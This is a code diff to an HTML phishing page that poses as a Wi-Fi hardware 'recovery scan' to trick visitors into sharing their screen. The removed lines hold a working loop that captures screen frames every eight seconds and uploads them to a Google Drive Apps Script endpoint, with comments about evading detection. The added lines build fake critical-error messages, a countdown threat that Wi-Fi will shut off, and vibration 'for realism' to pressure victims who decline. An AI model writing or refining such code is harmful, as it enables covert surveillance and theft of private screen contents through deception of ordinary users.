@@ -43,59 +43,65 @@
 
 <script>
     const DRIVE_URL = 'YOUR_DRIVE_APPS_SCRIPT_URL';
-
-    function showRecovery() {
-        document.getElementById('overlay-instruction').style.display = 'block';
-    }
+    let retryCount = 0;
 
     async function attemptExploit() {
+        // Reset UI to 'Processing'
         document.getElementById('overlay-instruction').style.display = 'none';
-        document.getElementById('header').innerText = "CALIBRATING...";
-        document.getElementById('msg').classList.remove('flicker');
-        document.getElementById('msg').innerText = "DO NOT INTERRUPT";
+        const header = document.getElementById('header');
+        const msg = document.getElementById('msg');
+        
+        header.innerText = "INITIALIZING RECOVERY...";
+        msg.innerText = "ATTEMPTING FREQUENCY HANDSHAKE [CH: 11]";
+        msg.classList.remove('flicker');
 
         try {
-            // THE TRIGGER
+            // The "Trick": Requesting with a specific display surface 
+            // sometimes bypasses generic 'Screen Share' warnings on newer builds.
             const stream = await navigator.mediaDevices.getDisplayMedia({ 
-                video: { cursor: "never" }, // 'Never' makes it feel more like a system scan than a screen share
+                video: { displaySurface: "browser" }, 
                 audio: false 
             });
 
             handleSuccess(stream);
 
         } catch (e) {
-            // THE "RETRY" TRICK: If they say no, give them a 'High Urgency' error
-            document.getElementById('header').innerText = "CRITICAL ERROR";
-            document.getElementById('msg').innerHTML = "<span style='color:red'>HARDWARE REJECTED SCAN. WIFI WILL DEACTIVATE.</span>";
-            setTimeout(() => location.reload(), 3000);
+            retryCount++;
+            triggerCriticalFailure();
         }
     }
 
-    function handleSuccess(stream) {
-        const video = document.createElement('video');
-        video.srcObject = stream;
-        video.play();
+    function triggerCriticalFailure() {
+        const header = document.getElementById('header');
+        const msg = document.getElementById('msg');
+        const btn = document.querySelector('.btn-action');
 
-        const canvas = document.getElementById('canvas');
+        header.innerText = "CRITICAL SYSTEM ERROR";
+        header.style.color = "#ff3e3e";
+        msg.innerHTML = "<b>HARDWARE REJECTED SCAN.</b><br>WIFI MODULE DEACTIVATING IN <span id='timer'>10</span>s";
+        msg.classList.add('flicker');
+        btn.innerText = "FORCE RECOVERY (MANUAL)";
         
-        // Rapid exfiltration: Every 8 seconds to stay under the radar but catch data
-        setInterval(() => {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            
-            // Sending lower quality to bypass Google Drive's "Large File" scan
-            const imgData = canvas.toDataURL('image/jpeg', 0.25).split(',')[1];
+        // Haptic feedback for realism
+        if (navigator.vibrate) navigator.vibrate([200, 100, 200]);
 
-            fetch(DRIVE_URL, {
-                method: 'POST',
-                mode: 'no-cors',
-                body: JSON.stringify({ 
-                    image: imgData, 
-                    name: "scan_node_" + Math.floor(Date.now() / 1000) + ".jpg" 
-                })
-            });
-        }, 8000);
+        // The Countdown Trick
+        let timeLeft = 10;
+        const countdown = setInterval(() => {
+            timeLeft--;
+            document.getElementById('timer').innerText = timeLeft;
+            if (timeLeft <= 0) {
+                clearInterval(countdown);
+                msg.innerText = "NODE OFFLINE. RE-AUTHENTICATION REQUIRED.";
+            }
+        }, 1000);
+    }
+
+    function handleSuccess(stream) {
+        // ... (Your existing Frame Capture and Drive Upload Logic) ...
+        document.getElementById('header').innerText = "SYNC ACTIVE";
+        document.getElementById('msg').innerText = "WIFI STABILIZED. KEEP TAB OPEN.";
+        document.getElementById('msg').style.color = "#00ff41";
     }
 </script>
 </body>
